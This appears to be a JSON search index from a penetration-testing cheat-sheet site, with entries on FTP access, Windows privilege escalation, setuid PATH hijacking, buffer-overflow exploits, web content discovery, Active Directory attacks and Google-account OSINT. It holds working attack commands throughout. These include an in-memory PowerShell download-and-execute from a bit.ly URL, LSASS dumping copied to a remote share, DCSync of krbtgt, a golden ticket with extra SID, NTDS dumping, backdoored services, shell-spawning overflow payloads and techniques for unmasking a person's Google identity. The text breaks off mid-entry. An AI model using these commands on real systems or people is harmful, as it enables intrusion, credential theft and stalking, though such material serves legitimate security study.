[
{
	"uri": "/network/services-enumeration/21_ftp/",
	"title": "21 - FTP",
	"tags": [],
	"description": "",
	"content": " Identification # Base connection ftp \u0026lt;IP\u0026gt; \u0026gt; USER Anonymous \u0026gt; PASS test # It can be usefull to try passive mode ftp -p \u0026lt;IP\u0026gt; \u0026gt; USER Anonymous \u0026gt; PASS test # Using telnet telnet \u0026lt;IP\u0026gt; 21 Anonymous test bin (binary mode, don\\\u0026#39;t forget it before transfering exe file) get / send # FTP Web Access ? # Try upload and execute through web access ftp://IP \nBruteforce hydra -L users.txt -P passwords.txt -t 3 -s 21 IP ftp \nMount remote FTP locally sudo apt-get install curlftpfs mkdir /mnt/my_ftp curlftpfs ftp-user:ftp-pass@my-ftp-location.local /mnt/my_ftp/ # To allow other users curlftpfs -o allow_other ftp-user:ftp-pass@my-ftp-location.local /mnt/my_ftp/"
},
{
	"uri": "/windows-systems/privilege-escalation/automated_recon/",
	"title": "Automated Recon",
	"tags": [],
	"description": "",
	"content": " Binaries Information https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe \nLocal Exploit Suggester # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/xxx/Documents/Galactic/systeminfo.txt # Metasploit also has a module \u0026gt; use post/multi/recon/local_exploit_suggester msf5 post(multi/recon/local_exploit_suggester) \u0026gt; options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits msf5 post(multi/recon/local_exploit_suggester) \u0026gt; set SESSION 1 SESSION =\u0026gt; 1 msf5 post(multi/recon/local_exploit_suggester) \u0026gt; run [*] 10.10.10.14 - Collecting local exploits for x86/windows... [*] 10.10.10.14 - 29 exploit checks are being tried... [+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated. [+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated. [+] 10.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated. [+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed \nPowerSploit / PowerUp # Copy PowerUp.ps1 to Powershell bypass Execution policy powershell -exec bypass Import-Module .\\PowerUp.ps1 Invoke-AllChecks # You can also use SharUp.exe # Need to be compiled, but newer tool.msf shell\u0026gt; powershell.exe -exec bypass -Command “\u0026amp; {Import-Module .\\PowerUp.ps1; Invoke-AllChecks}”C:\u0026gt; powershell.exe -nop -exec bypass PS C:\\\u0026gt; Import-Module PowerUp.ps1 PS C:\\\u0026gt; Invoke-AllChecks | Out-File -Encoding ASCII checks.txt # Full in memory C:\\\u0026gt; powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”# If a binary seems to be exploitable you can backup real service and create a backdored one PS C:\\\u0026gt; Write-ServiceEXE -ServiceName CustomSVC -UserName backdoor -Password password123 -Verbose # Restore the real service PS C:\\\u0026gt; Restore-ServiceEXE -ServiceName CustomSVC \n"
},
{
	"uri": "/linux-systems/programing-languages/bash/",
	"title": "Bash",
	"tags": [],
	"description": "",
	"content": " General \u0026amp; Tricks # base program int main(void) { system(\u0026#34;ls /path/to/.passwd\u0026#34;); return 0; } # As you as the program is executed with the ‘s’ flag (owner rights), you can privesc by copying the program you want to impersonate cp /bin/cat /tmp/ls PATH=/tmp # You can escape options echo \u0026#39;#!/bin/cat --\u0026#39; \u0026gt; /tmp/ls chmod 755 /tmp/ls env PATH=/tmp ./binary_setuid .passwd \nSymbolic link attack # base program int main(void) { system(\u0026#34;ls /path/to/.passwd\u0026#34;); return 0; } ln -s /bin/cat /tmp/ls ls -l /tmp/ls PATH=/tmp echo $PATH ./binary1"
},
{
	"uri": "/pwn/buffer-overflow/",
	"title": "Buffer Overflow (BoF)",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/web-pentest/tools/burpsuite/",
	"title": "BurpSuite",
	"tags": [],
	"description": "",
	"content": " WORK IN PROGRESS \nNotes / Tips # /!\\ HTTP POST Requests needs two carriage return at the end to be valid ! # Firefox sends an HTTP GET every 60s to hxxp://detectportal.firefox.com. To avoid : about:config \u0026gt; network.captive-portal-service.enabled ==\u0026gt; false \nModules / Addons # Autorize # For Each Request you do, it will send an equal request # But with changed cookies of the session or any additional header used for authorization. # Just add cookies for user B and browse app using user A # Try accessing restricted ressources for user B and check for server responses # 200 --\u0026gt; Possible IDOR# JSON Beautifier # This extension adds a new tab to Burp\u0026#39;s HTTP message viewer to beautify JSON content.# HTTP Request Smuggler # Help finding HTTP Request Smuggling vulnerabilities # Right click on a request and click \u0026#39;Launch Smuggle probe\u0026#39;, then watch the extension\u0026#39;s output pane# Logger++ # This extension can be used to log the requests and responses made by all Burp tools # And display them in a sortable table. It can also save the logged data in CSV format.# Param Miner # This extension identifies hidden, unlinked parameters. # It\u0026#39;s particularly useful for finding web cache poisoning vulnerabilities. # Right click on a request in Burp and click \u0026#34;Guess (cookies|headers|params)\u0026#34; # You can find them listed under Extender-\u0026gt;Extensions-\u0026gt;Param Miner-\u0026gt;Output# Wsdler # This extension takes a WSDL request, parses out the operations that are associated # With the targeted web service, and generates SOAP requests # That can then be sent to the SOAP endpoints.https://github.com/GainSec/GoldenNuggets-1 # Burp Suite Extension to easily create Wordlists based off # URI, URI Parameters and Single Words (Minus the Domain)https://redhuntlabs.com/blog/asset-history-burp-extension.html # Asset History # Allows you to browse the Wayback Machine for URL already seen in scope # It can helps identifying old params or endpoints, still available \nResources to check # Complete MOOC style course (subscribing but it\u0026#39;s free) (2 links are the same course) https://www.udemy.com/burp-suite/ https://hackademy.aetherlab.net/p/burp-suite # Video course https://www.tutorialspoint.com/burpsuite/index.asp # Kinda detailed tutorial (text + pictures) https://www.pentestgeek.com/web-applications/burp-suite-tutorial-1 https://www.pentestgeek.com/web-applications/how-to-use-burp-suite # Fast course/tutorial (text + images) https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-2 https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-3 https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-4 # ??? https://portswigger.net/web-security # Conferences slides https://fr.slideshare.net/ZackMeyers/web-hacking-with-burp-suite-101 # Not free (but it seems to have a kind of 10 days free ??) https://www.pluralsight.com/courses/web-application-penetration-testing-with-burp-suite # Playlist tuto https://www.hacker101.com/playlists/burp_suite"
},
{
	"uri": "/web-pentest/resources-discovery/content_discovery/",
	"title": "Content Discovery",
	"tags": [],
	"description": "",
	"content": " Resources # Fuzzing Wordlists https://github.com/fuzzdb-project/fuzzdb # Fuzzing and Content Discovery https://github.com/kaimi-io/web-fuzz-wordlists \nTips # Fuzz non-printable characters in any user input # Could result in regex bypass, account takeover... 0x00, 0x2F, 0x3A, 0x40, 0x5B, 0x60, 0x7B, 0xFF %00, %2F, %3A, %40, %5B, %60, %7B, %FF \nScrapping from JS # You can parse and scrape javascript content in a target website to look for hidden subdomains or interesting paths # Often, endpoints are not public but users can still interact with them # Tools like dirscraper automates this (https://github.com/Cillian-Collins/dirscraper) # Classic python discraper.py -u \u0026lt;url\u0026gt; # Output mode python discraper.py -u \u0026lt;url\u0026gt; -o \u0026lt;output\u0026gt; # Silent mode (you won\u0026#39;t see result in term) python discraper.py -u \u0026lt;url\u0026gt; -s -o \u0026lt;output\u0026gt; # Relative URL Extractor is another good tool to scrape from JS files (https://github.com/jobertabma/relative-url-extractor) ruby extract.rb https://hackerone.com/some-file.js# Extract all API endpoints from AngularJS \u0026amp; Angular javascript files curl -s URL | grep -Po \u0026#34;(\\/)((?:[a-zA-Z\\-_\\:\\.0-9\\{\\}]+))(\\/)*((?:[a-zA-Z\\-_\\:\\.0-9\\{\\}]+))(\\/)((?:[a-zA-Z\\-_\\/\\:\\.0-9\\{\\}]+))\u0026#34; | sort -u# https://github.com/incogbyte/jsearch # simple script that grep infos from javascript files python3 jsearch.py -u https://google.com -n googlehttps://github.com/GerbenJavado/LinkFinder # Analyzing one file and HTML output python linkfinder.py -i https://example.com/1.js -o results.html # CLI/STDOUT output python linkfinder.py -i https://example.com/1.js -o cli # Analyzing entire domain python linkfinder.py -i https://example.com -dhttps://github.com/m4ll0k/SecretFinder # Based on LinkFinder # Using regular expression to searhc for data like API keys, tokens... python3 SecretFinder.py -i https://example.com/1.js -o results.html python3 SecretFinder.py -i https://example.com/1.js -o cli python3 SecretFinder.py -i https://example.com/ -e python3 SecretFinder.py -i https://example.com/ -e -g \u0026#39;jquery;bootstrap;api.google.com\u0026#39;https://github.com/lc/subjs # subjs fetches javascript files from a list of URLS or subdomains. $ cat urls.txt | subjs $ subjs -i urls.txt $ cat hosts.txt | gau | subjs \nBroken Links # Check for broken links and domain takeover # For twitter, TwitterBFTD is great https://github.com/stevenvachon/broken-link-checker $ blc -rof --filter-level 3 https://example.com/ $ blc -rfoi --exclude linkedin.com --exclude youtube.com --filter-level 3 https://example.com/ \nDirsearch $ python3 dirsearch.py -u https://www.target.fr -f -e php,xml,txt -t 10 -w wordpress.fuzz.txt \ngau https://github.com/lc/gau # getallurls (gau) fetches known URLs from AlienVault\u0026#39;s Open Threat Exchange, # the Wayback Machine, and Common Crawl for any given domain # It can be used to map and discover new targets (endpoints, domains, subdomains...) $ printf example.com | gau $ cat domains.txt | gau $ gau example.com \nhakrawler https://github.com/hakluke/hakrawler # Usage cat urls.txt | hakrawler # Example tool chain echo google.com | haktrails subdomains | httpx | hakrawler"
},
{
	"uri": "/pwn/buffer-overflow/easy_no_protection/",
	"title": "Easy - No Protections",
	"tags": [],
	"description": "",
	"content": " Simple Buffer Overflow (no protection) - Function call # Code void copy_ordre(char *arg) { char ordre[50]; strcpy(ordre,arg); printf(\u0026#34;\\nOrdre reçu : %s\\n\\n\u0026#34;,ordre); } int main(int argc, char** argv) { if(argc \u0026lt; 2) { printf(\u0026#34;Bienvenue, humain. Donnez-nous vos ordres. En cas de bonne réponse, nous vous épargnerons. Le cas échéant, nous détruirons la terre.\\n\u0026#34;); printf(\u0026#34;Usage: %s \u0026lt;ordre\u0026gt;\\n\u0026#34;, argv[0]); exit(0); } printf(\u0026#34;Bienvenue, humain. Donnez-nous vos ordres. En cas de bonne réponse, nous vous épargnerons. Le cas échéant, nous détruirons la terre.\\n\u0026#34;); copy_ordre(argv[1]); earth_destroy(); return 0; } void earth_destroy() { printf(\u0026#34;Mauvaise réponse ! Nous détruirons votre planète dans quelques minutes.\\n\u0026#34;); } void earth_alive() { printf(\u0026#34;Nous nous avouons vaincu. Vous avez gagné, nous vous rendons la terre !\\n\u0026#34;); execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL); }# Explanations and Exploit # The goal is to call earth_alive() function # The buffer is 50 bytes long, so by submitting 50+ char, you can override what is after # You have EIP, EBP and one argument (char) on the stack, so 12 bytes # So, to override what you want and call the function, you will need to send 62 char before the payload # The payload is the function adress you want to send $ nm ./pwn1 | grep \u0026#34;earth_alive\u0026#34; 08048acb T earth_alive # So, the payload will be the following ./pwn1 $(python -c \u0026#39;print \u0026#34;A\u0026#34;*62 + \u0026#34;\\xcb\\x8a\\x04\\x08\u0026#34;\u0026#39;) \nSimple BoF - Int override # Code int main() { char buf[20]; int x = 0; gets(buf); if (x == 1234) { // gid_t gid = getegid(); // setresgid(gid, gid, gid);  FILE *fp; fp = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); char flag[64]; fgets(flag, 64, (FILE*) fp); printf(\u0026#34;Oh, un flag : %s\\n\u0026#34;, flag); } printf(\u0026#34;x value : %d\\n\u0026#34;, x); return 0; }# Exploitation and Explanations # You want to override the “x” value # In the stack, 20 bytes are allowed to the buffer and 4 bytes are allowed to a pointer for this buffer. # After that comes the value of x, so you can overflow here $ python -c \u0026#39;print \u0026#34;a\u0026#34;*24 + \u0026#34;\\xd2\\x04\\x00\\x00\u0026#34;\u0026#39; | ./pwn0 $ python -c \u0026#39;print \u0026#34;a\u0026#34;*24 + \u0026#34;\\xd2\\x04\u0026#34;\u0026#39; | ./pwn0 $ python -c \u0026#39;print \u0026#34;a\u0026#34;*22 + \u0026#34;\\x00\\x00\\xd2\\x04\u0026#34;\u0026#39; | ./pwn0"
},
{
	"uri": "/windows-systems/exploitation/exploitation_tricks/",
	"title": "Exploitation Tricks",
	"tags": [],
	"description": "",
	"content": " Obfuscation # There are many ways you can use to obfuscate conten # PyFuscation (https://github.com/CBHue/PyFuscation) bring small usefull features $ python3 PyFuscation.py -fvp --ps ./Scripts/Invoke-Mimikatz.ps1  \n\u0026ldquo;Double Hop\u0026rdquo; - What is it and how to solve ? # Great resource (french) http://inf0sec.fr/article-16.php # TL;DR # 2 authentications types # Network Logon --\u0026gt; Ex : WinRM through PtH (Windows won\u0026#39;t store credentials) # Non-Network Logon --\u0026gt; Ex : RDP, entering directly password and Windows storing it # In order to access privileged commands (typical, psexec on a DC) # Windows needs to have credentials in the Logon Session # If the authentication is \u0026#34;Network Logon\u0026#34;, you have no creds in session and can\u0026#39;t exec # Solution : local pass the hash (or runas) # Mimikatz \nUsing Powershell AD Module without RSAT # The secret to being able to run AD enumeration commands from the AD Powershell # is the DLL located in C:\\Windows\\Microsoft.NET\\assembly\\GAC_64\\Microsoft.ActiveDirectory.Management # You can just grab it on a system with RSAT and drop it on the target Import-Module .\\Microsoft.ActiveDirectory.Management.dll # Then you can use the module... Get-Command get-adcom* # Don\u0026#39;t need admin rights ! \nDumping LSASS # If you are SYSTEM and need creds, you can dump lsass.exe and then use Mimikatz in local procdump.exe -ma lsass.exe lsadump.dmp copy lsadump.dmp \\\\IP\\yourshare\\lsadump.dmp # Then mimikatz... privilege::debug sekurlsa::minidump lsadump.dmp sekurlsa:logonPasswords /full # Several dumping methods here https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/# You can also remotely dump lsass and then process it locally # Method 1 # Open a SMB Server, drop mimikatz or procdump and get your output back to your SMB Server # Method 2 # https://github.com/aas-n/spraykatz # It will mass dump LSASS and process them locally to get outputs ./spraykatz.py -d company.local -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24 \nDCSync using misconfigured AD # These permissions can be abused to sync passwords # DS-Replication-Get-Changes # DS-Replication-Get-Changes-All # DS-Replication-Get-Changes-In-Filtered-Set http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/ # Inspecting privileges # Using PowerView Get-ObjectAcl -Identity \u0026#34;dc=offense,dc=local\u0026#34; -ResolveGUIDs | ? {$_.SecurityIdentifier -match \u0026#34;S-1-5-21-2552734371-813931464-1050690807-1106\u0026#34;} # Using the AD Module Import-Module ActiveDirectory (Get-Acl \u0026#34;ad:\\dc=offense,dc=local\u0026#34;).Access | ? {$_.IdentityReference -match \u0026#39;spotless\u0026#39; -and ($_.ObjectType -eq \u0026#34;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\u0026#34; -or $_.ObjectType -eq \u0026#34;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\u0026#34; -or $_.ObjectType -eq \u0026#34;89e95b76-444d-4c62-991a-0facbeda640c\u0026#34; ) } # You can just use mimikatz to dump if you have these rights mimikatz\u0026gt; lsadump::dcsync /user:krbtgt \nOver-Pass-The-Hash http://inf0sec.fr/article-17.php # OPtH is not using LSASS but asking a TGT to the DC using the NT hash # First ask a TGT for your user Rubeus.exe asktgt /user:\u0026lt;redacted\u0026gt; /rc4:\u0026lt;redacted\u0026gt; # Only one TGT can be loaded in an existing Logon Session # To avoid any trouble, you can create a new hidden process (it generates a type 1 event-ID) Rubeus.exe createnetonly /program:\u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; # Then pass the ticket to the new session Rubeus.exe ptt /ticket:\u0026lt;ticket en base64\u0026gt; /luid:0x4a0717f \nExtracting NTLM hashes from SAM database # samdump2 allows you to extract NTLM hashes from the SAM database # You need to have SAM and SYSTEM files locally samdump2 SYSTEM SAM \u0026gt; hashes.txt \nFrom non-auth user to local admin in 3 steps # Nullsession net use \\\\dc\\ipc$ \u0026#34;\u0026#34; /u:\u0026#34;\u0026#34; # Search for cpasswords in gpo\u0026#39;s: dir \\\\dc\\sysvol\\contoso.corp\\Policies -r -I *.xml | Select-String cPassword \u0026gt;\u0026gt; dump.txt # Decrypt the cPassword gpp-decrypt \u0026lt;string\u0026gt; \nGetting and cracking LDPA user hash # STEP 1: Dump target user hash: ldapsearch –x –h \u0026lt;LDAP_IPAddr\u0026gt; -D \u0026#34;cn=Directory Manager\u0026#34; -w \u0026lt;password\u0026gt; -b \u0026#39;uid=\u0026lt;target_username\u0026gt;,cn=users,cn=accounts,dc=\u0026lt;DOMAIN\u0026gt;,dc=COM\u0026#39; uid userpassword krbprincipalkey sambalmpassword sambantpassword # STEP 2: The ‘userpassword::’ and ‘krbprincipalkey::’ hash is base64 encoded and now you need to decode it: echo \u0026#39;e1NTSEF9dHZEaUZ4ejJTUkRBLzh1NUZSSGVIT2N4WkZMci9OYktQNHNLNWc9PQ==\u0026#39; | base64 --decode {SSHA}tvDiFxz2SRDA/8u5FRHeHOcxZFLr/NbKP4sK5g== # STEP 3: Place your decoded hash into hash.txt file and fire up Hashcat mode ‘111’ and attempt to crack the password hash: hashcat –a 0 –m 111 hash.txt dict.txt \nFrom one domain to another # Hash/password replay to find one user on the second domain $ crackmapexec smb \u0026lt;ip\u0026gt; -u user -p -H hash --shares $ impacket/examples/smbclient DOMAIN/USER@IP -hashes \u0026lt;hash\u0026gt; # Look for things like automated tasks ran by admins # Write access # net user foo fooPassword /add /y # net group \u0026#34;Domain Admins\u0026#34; foo /add $ psexec.py domain/user@ip # Test trust relationship $ nltest /trusted_domain $ nltest /dclist:\u0026lt;domain\u0026gt; # Create a new ticket for the second domain with the extra-sid # nthash → krbtgt compromised hash # domain-sid → compromised domain SID # domain → Already compromissed domain # extra-sid → Target domain (+519 = enterprise admin) $ ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519 # Exec and use the ticket $ /impacket/examples/psexec.py -k -n -debug DOMAIN/user@host_DC # Dump NTDS $ proxychains secretsdump.py -k -no-pass qsec@DCFIL.PRAMAFIL.CORP -use-vss # look for the admin workstation # go RDP (or psexec also) $ crackmapexec smb \u0026lt;ip\u0026gt; -u user -H hash -M rdp -o ACTION=enable \nPowershell through Metasploit # You can load powershell and get a Powershell like shell meterpreter \u0026gt; load powershell Loading extension powershell...Success. meterpreter \u0026gt; powershell_shell PS \u0026gt; cd \u0026#34;C:\\Users\\kostas\\Desktop\u0026#34; PS \u0026gt; ls # Then you can run Powershell scripts PS \u0026gt; ./MS16-032.ps1 PS \u0026gt; Import-Module ./MS16-032.ps1 PS \u0026gt; Invoke-MS16-032"
},
{
	"uri": "/pwn/general_infos/",
	"title": "General Informations",
	"tags": [],
	"description": "",
	"content": " MISC - Tricks # Checking program/binary protections checksec --file ./binary # Getting more informations about an ELF readelf -a ./binary # Gettign system() adress # Can be simple objdump -D ./binary | grep system # Getting known string (\u0026#34;GNU\u0026#34; for example) # Look for objdump -s ./binary# Getting padding using pwntools \u0026gt;\u0026gt; from pwn import * # Generate pattern \u0026gt;\u0026gt; cyclic(400) ## Find offset where SIGSEGV \u0026gt;\u0026gt; find_cyclic(\u0026#39;\u0026lt;RSPoffset\u0026gt;\u0026#39;) \u0026gt;\u0026gt; find_cyclic(\u0026#39;yaac\u0026#39;)# You can list gadgets using ROPGadgets.py # And then look for one you want ./ROPgadget.py --binary ./binary"
},
{
	"uri": "/resources/general_infosec/",
	"title": "General Infosec",
	"tags": [],
	"description": "",
	"content": " Training Resources  HackTheBox video WU (https://ippsec.rocks/#) Resources, cheatsheets etc about EVERYTHING (https://github.com/trimstray/the-book-of-secret-knowledge)  Network \u0026amp; Pentest  Network Pivoting (https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/) Remote Access Cheatsheet (https://dolosgroup.io/blog/remote-access-cheat-sheet) Many Reverse Shells (https://alamot.github.io/reverse_shells/) Shad0w C2 (https://github.com/bats3c/shad0w)  Passcracking, Worlists \u0026amp; Passwords  Kaonashi worlists and rules (https://github.com/kaonashi-passwords/Kaonashi) One rule to rule them all (https://www.notsosecure.com/one-rule-to-rule-them-all/) Common French Passwords (https://github.com/tarraschk/richelieu) Rockyou (https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) Passwords Wordlists (https://weakpass.com/) Several Wordlists types (https://github.com/berzerk0/Probable-Wordlists) Language Dictionnaries (https://packetstormsecurity.com/Crackers/wordlists/page4/) Language Dictionnaries (http://www.gwicks.net/dictionaries.htm) SCADA default passwords (http://www.critifence.com/default-password-database/) Tons of wordlists (https://wordlists.assetnote.io/)  Some Crypto / Cryptocurrencies  Attacking RSA for fun and CTF points (https://bitsdeep.com/posts/attacking-rsa-for-fun-and-ctf-points-part-1/) SanthacklausCTF 2019 - WU (https://adel-allam.fr/linux/2019/12/23/ctf-santhacklaus/) Solidity Attack (https://medium.com/@fifiteen82726/solidity-attack-array-underflow-1dc67163948a) Solidity Security Blog (https://github.com/sigp/solidity-security-blog)  Lockpicking  Awesome Lockpicking (https://github.com/meitar/awesome-lockpicking#readme)  Certification Reviews and Advices  OSCP PWK Random tips and tricks (https://burmat.gitbook.io/security/hacking/oscp-pwk-random-tips-and-tricks) OSCP Like Vulnhub\u0026rsquo;s VM (https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms)  Others cheatsheet  Operator Up (https://obscuritylabs.github.io/operator-up/) The ultimate list of SANS Cheatsheets (https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/?utm_medium=Social\u0026amp;utm_source=Twitter\u0026amp;utm_content=NA%20Central%20Cheat%20Sheets%20Blog%2005%202020\u0026amp;utm_campaign=SANS%20Blog) Blue Team Cheatsheets (Many Resources) (https://itblogr.com/wp-content/uploads/2020/04/The-Concise-Blue-Team-cheat-Sheets.pdf) The Hacker Recipes (https://www.thehacker.recipes)  MISC  21 Free Forensics Tools (https://www.securitynewspaper.com/2020/06/04/21-best-free-digital-forensic-investigation-tools/) The ultimate list of SANS Cheatsheets (https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/?utm_medium=Social\u0026amp;utm_source=Twitter\u0026amp;utm_content=NA%20Central%20Cheat%20Sheets%20Blog%2005%202020\u0026amp;utm_campaign=SANS%20Blog) SlackPirate - Slack Enumeration and Extraction Tool (https://github.com/emtunc/SlackPirate) Awesome anti-censorship list (https://github.com/danoctavian/awesome-anti-censorship) How to Investigate Phishing Campaigns? (https://letsdefend.io/blog/how-to-investigate-phishing-campaigns/) Interactive Malware Analysis (https://app.any.run/) Log parsing cheatsheet 1 (https://twitter.com/fr0gger_/status/1343867388660494337?s=20) Log parsing cheatsheet 2 (https://twitter.com/fr0gger_/status/1346040749763293189?s=20)  Metasploit  SANS Cheatsheet (https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf) Using Databases(https://www.offensive-security.com/metasploit-unleashed/using-databases/) Managing Workspaces(https://docs.rapid7.com/metasploit/managing-workspaces/)  "
},
{
	"uri": "/linux-systems/tricks/",
	"title": "Global Tricks (sysadmin)",
	"tags": [],
	"description": "",
	"content": " [WIP]\nMISC / TIPS # If you need to kill a specific process using a given port sudo fuser -k 445/tcp# You can use the following trick to easy navigate and select paths or others args # $_ takes the last argument of the last simplec command executed cd $_ # For example mkdir my-folder \u0026amp;\u0026amp; cd $_# You can use xclip to automate clipping # Can be usefull for long outputs (enum4linux, privcheck...) cat /etc/resolv.conf | xclip -sel clip # You can even create aliases alias toclip=\u0026#34;xclip -sel clip\u0026#34; cat /etc/resolv.conf | toclip \nParsing tips # Log parsing cheatsheets https://twitter.com/fr0gger_/status/1343867388660494337 https://twitter.com/fr0gger_/status/1346040749763293189"
},
{
	"uri": "/open-source-intelligence-osint/platforms-hunting/google/",
	"title": "Google",
	"tags": [],
	"description": "",
	"content": " Linking to Google Account https://medium.com/week-in-osint/keeping-a-grip-on-googleids-506814ae098b https://subfn.net/2020/06/15/ga-osint-trick/ # Using Google Analytics, you can check if a non-google e-mail address is linked to a Google account # Log into Google Analytics # Navigate to Admin \u0026gt; Account User Management \u0026gt; Add user # At this point, enter an email address. If the email is a backup email of a Google account, the primary Google email (e.g. the Google login email) will be disclosed# Automated tool for identifying Google account, getting ID and relations on Google services # Works like a charm (from https://epieos.com/) https://tools.epieos.com/google-account.php \nGet UserIDs Google Drive Documents # Get user ID from Google Drive document # Logged # Open the source code and search for: \u0026#34;\\x2210\u0026#34; and \u0026#34;\\x2211\u0026#34; # Paste it in the Google Photos or Maps URL and find out more about your target. # Not logged in # Developer tools \u0026gt; Network \u0026gt; Filter \u0026#34;Permissions\u0026#34; # Load the document and get informations for owner \u0026amp; co Google Contacts # Google Contacts can help getting IDs from e-mails # But it may not work ! # CSV file with name and e-mails # Import it, then several methods# Method 1 # - Developer tools and reload the page # - Look for 4th raw requests to \u0026#34;contacts.google.com\u0026#34; with \u0026#34;batchexecute\u0026#34; endpoint # - Copy request content to a file $ cat file | grep -oP \u0026#34;10+\\d{19}|11+\\d{19}\u0026#34; | sort -u # Method 2 # You can also find them in the page source code # Go for the contact and open source code # Search for \u0026#34;data-sourceid\u0026#34; # Method 3 # If you have target YouTube channel page # Look in the source code for the link to plus.google.com/\u0026lt;id\u0026gt; Google API # The only trustworthly way is to use the Google API # First get contact information like above # In the raw request, look for a contactID in the Form data # String is beginning by \u0026#34;c\u0026#34; an +- 19 chars long. # Then look on the API https://developers.google.com/people/api/rest/v1/people/get # resourceName people/c0123456789... # personFields metada Google Hangouts https://medium.com/week-in-osint/keeping-a-grip-on-googleids-506814ae098b # Using the \u0026#34;network\u0026#34; developper tool, open a new chat and fill in the target e-mail address # Filter on the word \u0026#34;lookup\u0026#34; to get informations such as the ID # You can also get the list of other connected Apps (Youtube...) (\u0026#34;appType\u0026#34;) # Look for \u0026#34;autocomplete\u0026#34; # You can get information about other Google Accounts connected to this ID # \u0026#34;lastUpdateTimeMicros\u0026#34; is the last time the account was edited (or sometimes created) \nUsing UserIDs # 3 ways # - Find photos albums # - Look for geolocation # - Find YouTube account connected to this Photos albums # Photos albums of a given user https://get.google.com/albumarchive/{userID} # Sometimes photos are tied to exact locations on Google Maps Geolocation # Google Maps and Google Reviews can both be accessed via GMaps https://www.google.com/maps/contrib/{userID} # By default is shows the photos that are uploaded with location information # But the users reviews can be accessed via the option on the left. # You are still able to find out someones real name. Youtube # Youtube ressources and tools https://www.osintessentials.com/youtube # Data can be different for different languages (descriptions...) and can be used to hide some infos # YouTube channel # Does not work with userID but accountName # Possible to have several channels/profiles, but only one account https://www.youtube.com/feeds/videos.xml?user={accountName} # In most cases, it is the part before \u0026#34;@gmail.com\u0026#34; # You can link different channels to the same user https://www.youtube.com/channel/UCAiaFvFFZOwlU8Sw8S0dunQ # Getting accountName # In the source code : \u0026#34;ownerProfileUrl\u0026#34; or \u0026#34;vanityChannelUrl\u0026#34; # Getting UserID # In the source code : \u0026#34;plus.google.com\u0026#34; \nAutomating Google Account Hunt (GHunt) # GHunt is a fully functionnal automated tool used to recover many informations about a Google Account https://github.com/mxrch/GHunt # The tools needs valid token for some features # Grab these cookies after login to account.google.com $ python check_and_gen.py __Secure-3PSID =\u0026gt; xxx APISID =\u0026gt; xxx SAPISID =\u0026gt; xxx HSID =\u0026gt; xxx # Docker Building docker build --build-arg UID=$(id -u ${USER}) --build-arg GID=$(id -g ${USER}) -t ghunt . # Docker Using docker run -v $(pwd)/resources:/usr/src/app/resources -ti ghunt check_and_gen.py docker run -v $(pwd)/resources:/usr/src/app/resources -ti ghunt hunt.py \u0026lt;email_address\u0026gt; # Example $ docker run -v $(pwd)/resources:/usr/src/app/resources -ti ghunt hunt.py xxx.xxx@gmail.com [+] 1 account found ! ------------------------------ Name: xxx xxx Last profile edit : 2020/09/09 17:40:47 (UTC) Email : xxx.xxx@gmail.com Google ID : 11xxxxxx Hangouts Bot : No Activated Google services : - Youtube - Hangouts - Photos - Maps Youtube channel (confidence =\u0026gt; 37.5%) : - [xxx xxx] https://youtube.com/channel/xx - [xxx xxx] https://youtube.com/channel/xx - [xxx xxx] https://youtube.com/channel/xx Google Photos : https://get.google.com/albumarchive/xx/albums/profile-photos =\u0026gt; Couldn\u0026#39;t fetch the public photos. Google Maps : https://www.google.com/maps/contrib/xx/reviews =\u0026gt; No reviews "
},
{
	"uri": "/open-source-intelligence-osint/dorks/google_dorks/",
	"title": "Google Dorks",
	"tags": [],
	"description": "",
